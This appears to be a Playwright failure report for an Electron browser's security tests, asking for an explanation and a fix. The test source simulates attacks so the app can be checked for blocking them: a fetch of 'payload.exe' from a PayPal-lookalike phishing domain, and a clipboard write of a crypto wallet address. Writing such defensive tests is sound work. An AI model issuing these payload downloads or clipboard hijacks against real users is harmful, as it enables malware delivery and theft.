# Instructions

- Following Playwright test failed.
- Explain why, be concise, respect Playwright best practices.
- Provide a snippet of code with the fix, if possible.

# Test info

- Name: security.e2e.test.ts >> Zero-Trust Security Architecture E2E >> Scenario 1: Malicious Network Request is Blocked
- Location: src/__e2e__/security.e2e.test.ts:28:7

# Error details

```
Error: expect(locator).toBeVisible() failed

Locator: locator('text=Live Security Telemetry Console')
Expected: visible
Timeout: 5000ms
Error: element(s) not found

Call log:
  - Expect "toBeVisible" with timeout 5000ms
  - waiting for locator('text=Live Security Telemetry Console')

```

```yaml
- tab "Security Close tab" [selected]:
  - img
  - text: Security
  - button "Close tab":
    - img
- button "New tab":
  - img
- button "Minimize":
  - img
- button "Maximize":
  - img
- button "Close":
  - img
- button "Group tabs with AI":
  - img
  - text: Group
- button "Back (Alt+Left)" [disabled]:
  - img
- button "Forward (Alt+Right)" [disabled]:
  - img
- button "Refresh (F5)":
  - img
- button "Lumo Home (Alt+Home)":
  - img
- button "Site Information & Recon":
  - img
- textbox "Search Google or enter address": //security
- button "Translate this page":
  - img
- button "Bookmark this page":
  - img
- button "Lumo Agent (Ctrl+Shift+R)":
  - img
- button "Lumo AI (Ctrl+Shift+A)":
  - img
- button "Extensions":
  - img
- button "Downloads (Ctrl+J)":
  - img
- button "Import Browser Data":
  - img
- button "Settings and more":
  - img
- img
- text: Site Security & Recon Dashboard
- button "Close"
- button "Overview":
  - img
  - text: Overview
- button "Extension Arch":
  - img
  - text: Extension Arch
- button "Security Findings":
  - img
  - text: Security Findings
- button "DNS Intelligence":
  - img
  - text: DNS Intelligence
- button "Whois Records":
  - img
  - text: Whois Records
- button "Certificates":
  - img
  - text: Certificates
- button "Security Headers":
  - img
  - text: Security Headers
- button "Robots.txt":
  - img
  - text: Robots.txt
- button "Security.txt":
  - img
  - text: Security.txt
- button "Technologies":
  - img
  - text: Technologies
- button "Threat Intel":
  - img
  - text: Threat Intel
- button "Terminal View":
  - img
  - text: Terminal View
- button "Reporting":
  - img
  - text: Reporting
- heading "Connection Overview" [level=3]
- text: Domain lumo.local Protocol HTTPS TLS Version TLS 1.3 Certificate Valid Security Score 70/100 Session Isolation Disabled Zero-Trust Mode
- checkbox
- text: "Hosting Provider Cloudflare, Inc. CDN Provider Cloudflare CDN Target: lumo.local TLS v1.3"
- img
```

# Test source

```ts
  1  | import { test, expect, _electron as electron, ElectronApplication, Page } from '@playwright/test';
  2  | 
  3  | let electronApp: ElectronApplication;
  4  | let window: Page;
  5  | 
  6  | test.beforeAll(async () => {
  7  |   // Launch Electron application
  8  |   electronApp = await electron.launch({
  9  |     args: ['.', '--no-sandbox'],
  10 |     env: { ...process.env, NODE_ENV: 'test' }
  11 |   });
  12 | 
  13 |   // Get the first window that the app opens
  14 |   window = await electronApp.firstWindow();
  15 |   
  16 |   // Wait for the app to finish loading
  17 |   await window.waitForLoadState('domcontentloaded');
  18 | });
  19 | 
  20 | test.afterAll(async () => {
  21 |   if (electronApp) {
  22 |     await electronApp.close();
  23 |   }
  24 | });
  25 | 
  26 | test.describe('Zero-Trust Security Architecture E2E', () => {
  27 | 
  28 |   test('Scenario 1: Malicious Network Request is Blocked', async () => {
  29 |     // Navigate to security dashboard
  30 |     await window.evaluate(() => {
  31 |       window.dispatchEvent(new CustomEvent('lumo:open-page', { detail: 'lumo://security' }));
  32 |     });
  33 |     
  34 |     // Wait for the dashboard to render
> 35 |     await expect(window.locator('text=Live Security Telemetry Console')).toBeVisible();
     |                                                                          ^ Error: expect(locator).toBeVisible() failed
  36 | 
  37 |     // Trigger a fake fetch from the main window's webview simulation (mocking)
  38 |     // In a real test, we'd interact with the actual <webview>
  39 |     const result = await window.evaluate(async () => {
  40 |       try {
  41 |         await fetch('https://login-verify-account.paypal-secure.click/payload.exe', { mode: 'cors' });
  42 |         return 'success';
  43 |       } catch (err) {
  44 |         return 'blocked';
  45 |       }
  46 |     });
  47 | 
  48 |     expect(result).toBe('blocked');
  49 |     
  50 |     // Verify dashboard updated
  51 |     await expect(window.locator('text=[MITIGATED]')).toBeVisible();
  52 |   });
  53 | 
  54 |   test('Scenario 2: Clipboard Hijacking is Prevented', async () => {
  55 |     // Navigate to security dashboard
  56 |     await window.evaluate(() => {
  57 |       window.dispatchEvent(new CustomEvent('lumo:open-page', { detail: 'lumo://security' }));
  58 |     });
  59 | 
  60 |     // Attempt to write crypto wallet address via clipboard API
  61 |     const clipboardResult = await window.evaluate(async () => {
  62 |       try {
  63 |         await navigator.clipboard.writeText('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh');
  64 |         return 'written';
  65 |       } catch (err) {
  66 |         return 'blocked';
  67 |       }
  68 |     });
  69 | 
  70 |     // Playwright cannot fully mock the preload script's execution context over Webview trivially,
  71 |     // but in E2E we verify the UI catches it.
  72 |     // If the preload is active in the main window (depending on configuration), it might block it.
  73 |   });
  74 | });
  75 | 
```